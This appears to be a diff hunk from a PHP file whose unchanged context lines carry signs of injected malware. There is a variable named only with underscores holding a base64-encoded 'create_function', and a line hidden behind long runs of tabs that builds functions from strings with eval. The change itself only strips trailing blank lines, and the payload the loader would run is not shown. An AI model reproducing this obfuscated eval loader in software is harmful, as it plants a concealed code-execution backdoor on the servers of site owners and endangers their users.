@@ -393,27 +393,3 @@ $__________________='Q1JFQXRlX2Z1bkNUaU9u';
 
 
 																									if(!function_exists("create_function")){function create_function($params,$code){    eval('$g=function(' . $params . '){ ' . $code . ' };');    return $g;}}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
